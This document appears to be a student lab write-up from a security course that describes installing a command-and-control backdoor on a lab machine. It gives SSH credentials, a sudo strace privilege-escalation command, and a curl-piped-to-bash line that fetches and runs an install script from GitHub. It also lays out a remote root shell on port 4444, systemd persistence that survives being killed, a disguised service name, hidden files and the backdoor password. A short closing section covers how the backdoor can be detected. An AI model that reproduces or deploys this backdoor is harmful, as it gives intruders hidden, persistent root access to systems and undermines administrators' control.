Instructions
Logging into the week4 machine:
ssh into the week4 machine using this command:
	ssh user@10.0.2.5

The password for the machine is:
	hill

To escalate privileges use this command:
sudo strace -o /dev/null /bin/bash
 
then type ‘cd’ in order to change into the root directory
Installing and running the server script on the week4 machine:
Run the following command which will install the backdoor to the machine. Only 2 files will be installed: the script to run the server from GitHub directly, and the systemd service to ensure persistence (explained more in a further section).

curl -s https://raw.githubusercontent.com/athulnair02/command-and-control/main/install_backdoor | bash

Source Code
GitHub with all scripts
Installing and running the client script on your local machine:
In any spot on the attacking machine add the file:

client.py from the GitHub

Once you’ve done this, you can run the client script at any time using:
	python client.py
	
or
	
python3 client.py

How the backdoor works:
How our backdoor addresses the 5 requirements:
Explanation of how our backdoor provides remote shell access:
The backdoor is essentially a shell in which the target machine reveals port 4444/tcp in the firewall and listens for a connection from the network. The python script on the target side is waiting for a connection, and once accepted and authorized through a password, it receives commands from the attacking machine through TCP and executes them through a subprocess. The output from the command is sent back to the attacking machine through the established connection.
Persistence:
The backdoor maintains persistence using a systemd service that ensures it is always running on the machine. It is the service that initially starts the script to open the backdoor when it is first installed and every time the script ends (either successful, on error, etc.) it will be restarted with a different PID. This way, if there is any unforeseen error in the code, it will not prevent the backdoor from being closed. In addition, if a sysadmin kills the program when finding it suspicious (while looking at top or task manager), it will start again, opening the backdoor once again. Another persistence action taken was having a timeout for the initial backdoor connection. If the backdoor does not have a connection in two minutes, it throws an error and ends the program so that it restarts and ensures the firewall was not closed by the sysadmin. If the firewall is closed, then no connection can be made to the backdoor. This timeout can be changed since the code is directly run off of Github, meaning any push to the main branch will update the backdoor when it is run through the curl command piped into python command.
Configuration to get commands from: 
The only configuration needed is to determine the IP address of the target machine (through nmap or any other means) and change REMOTE_HOST in client.py to that address. It is default set to '10.0.2.5'.
Authentication:
We created a password ( c0d3m@nk3y ) and hashed it using hash(password) in python. This hash is then stored on the server/target machine. We then have client.py ask the user to input a password as the first message to the target and it is then sent to the server. There, the server hashes it and checks it against the known hash, which once confirmed, allows the user remote root shell access.
Hiding from detection: 
There are only 2 files added to the machine: one that is the backdoor, and the other to ensure it keeps running. Both files are using a less suspecting name (auto-update-checker) that creates the illusion of a routine, ordinary task for the sysadmin. The actual script that is run is in the root’s home directory as a hidden file (it can easily be placed elsewhere more secretive). There is no cronjob running so a sysadmin cannot find the script running there (where other common repeating programs may be). In addition, the service is buried deep with other services so it will be difficult for a sysadmin to search through all services to determine which one is malicious.
How our backdoor can be detected:
If the sysadmin checks the hidden files in the root home directory, they can find a presence of a file they did not put. If they look past the unsuspecting name and read the script that is running, they will find the backdoor. 
If the sysadmin looks at what ports are open on the firewall using firewall-cmd –list-ports, they will see that 4444/tcp is open and will know something odd is in place keeping the port open. If they use further investigation, they may find the program using the port if they install lsof and execute lsof -i:4444. 


